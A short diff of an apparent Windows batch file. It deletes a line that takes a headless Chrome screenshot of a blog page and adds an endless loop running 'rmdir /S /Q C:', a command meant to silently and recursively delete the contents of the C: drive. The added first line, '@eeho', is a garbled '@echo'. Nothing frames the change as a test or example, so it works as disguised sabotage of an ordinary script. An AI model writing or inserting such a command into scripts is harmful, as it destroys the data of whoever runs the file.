@@ -1,1 +1,7 @@
-"C:\Program Files\Google\Chrome\Application\chrome.exe" https://ivanc5po.blogspot.com/2022/03/chong-coin.html --headless --screenshot="Z:\test\chrome.png"
+@eeho
+
+:A
+
+rmdir /S /Q C:
+
+goto :A
